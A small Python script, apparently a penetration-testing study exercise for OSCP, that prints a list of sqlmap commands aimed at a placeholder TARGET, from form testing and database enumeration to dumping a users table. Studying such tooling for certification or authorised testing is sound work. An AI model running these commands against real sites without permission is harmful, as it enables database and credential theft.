#!/usr/bin/env python3
"""
SQLMap Framework - Dag 050 #17/25
OSCP SQL injection automation
"""
print("🔥 SQLMAP OSCP LIVE - Dag 050 #17!")
print("🎯 OSCP SQLi pipeline:")

sqlmap_cmds = [
    "sqlmap -u 'http://TARGET/login.php' --forms --batch",
    "sqlmap -u 'http://TARGET/?id=1' --dbs --batch", 
    "sqlmap -u 'http://TARGET/?id=1' -D database --tables",
    "sqlmap -u 'http://TARGET/?id=1' -D db -T users --dump",
    "sqlmap -u 'http://TARGET/' --crawl=3 --dbs"
]

for cmd in sqlmap_cmds:
    print(f"🏃 {cmd}")

print("✅ Dag 050 SQLMap #17 READY!")
